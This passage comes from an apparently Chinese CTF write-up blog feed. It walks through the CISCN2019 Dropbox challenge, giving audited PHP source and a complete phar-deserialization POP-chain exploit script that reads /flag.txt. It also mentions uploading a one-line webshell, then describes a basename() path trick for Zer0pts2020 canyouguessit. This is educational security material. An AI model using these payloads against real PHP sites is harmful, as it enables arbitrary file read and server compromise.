class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码：</p><p>index.php中，$a是一个FileList对象，并且调用了Name()，Size()方法，然而class.php中的FileList类并没有这两个方法，同时又有__call()方法，这里就存在一个反序列化的利用点</p><p>跟进__call()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$func的值为调用的”不存在的方法“，该__call()方法功能就是对每个文件都调用$func所代表的方法，在该类的构造函数中可以看到$this-&gt;files中的元素都是File类的对象，进入File类</p><p>File类中有close()方法，跟进它</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了<code>file_get_contents()</code>方法，该方法会读取$this-&gt;filename所代表文件的所有内容，可以用来实现任意文件读取</p><p>pop链大致已经出来了，让一个FileList对象调用close方法，来触发__call方法，从而触发File对象的close方法进行任意文件读取，现在还要解决的一个问题就是，如何让一个FileList对象去调用close方法，全局搜索close，可以在User类中找到它的析构函数，跟进一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;db可控，这里就是反序列化的起点</p><p>下面构造exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files   = [<span class="keyword">new</span> File(<span class="string">&quot;/flag.txt&quot;</span>)];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs   = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.phar&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行脚本生成phar文件，改后缀上传</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124145611612.png" alt="image-20220124145611612"></p><p>这里还有最后一个点，就是上面提到的download.php会把含有字符串<code>flag</code>的文件都过滤掉，用下载方法的话是看不到flag文件的，整个页面还剩下最后一个删除功能没有使用，先查看delete.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和download.php一对比就发现delete.php中少了对<code>flag</code>的过滤，所以最后我们要用删除来查看flag，抓包，修改文件名，发送报文即可得到flag</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124152700472.png" alt="image-20220124152700472"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;注册账号，登录，进入一个网盘管理页面，允许进行&lt;code&gt;jpg/png/gif&lt;/code&gt;文件的上传和下载，上传一句话木马然后抓包，绕过&lt;code&gt;Content-Type&lt;/code&gt;验证，即可在列表中看到上传的文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/01</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>两道代码审计</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/19/%E4%B8%A4%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/19/%E4%B8%A4%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-01-19T01:16:03.000Z</published>
    <updated>2022-01-20T08:28:10.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Zer0pts2020-canyouguessit"><a href="#Zer0pts2020-canyouguessit" class="headerlink" title="[Zer0pts2020]canyouguessit"></a>[Zer0pts2020]canyouguessit</h1><p>题目提供源码查询键，跳转到源码界面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计得到信息：</p><p>$secret是一串随机的十六进制字符串，如果$secret和$guess相等就输出flag，但是$secret长度为64位，应该是无法爆破，并且$guess和$secret比较时也用的是安全的<a href="https://www.php.net/manual/zh/function.hash-equals.php">hash_equals()</a>，应该也绕过不了</p><p>现在来看<a href="https://www.php.net/manual/zh/function.hash-equals.php">basename()</a>，这个函数会返回路径中的文件名部分，而PHP_SELF是指向当前正在执行的文件名</p><p>因此<code>/index.php?source</code>就会直接返回index.php的源码</p><p>那么将路径改为<code>/index.php/config.php?source</code>就能返回flag，接下来的任务就是要绕过正则</p><p>basename()有一个漏洞，它会去除文件开头的非ascii字符，故构造<code>/index.php/config.php/%ff?source</code>，页面就会回显flag</p><h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p>进来是一个登录界面，随便输个账户密码登录，回显无该用户，也没个注册页面，题目叫ezphp，那感觉也不是注入，先扫一遍目录，<code>www.zip</code>源码泄露，解压得4个php文件，审计一下</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">      <span 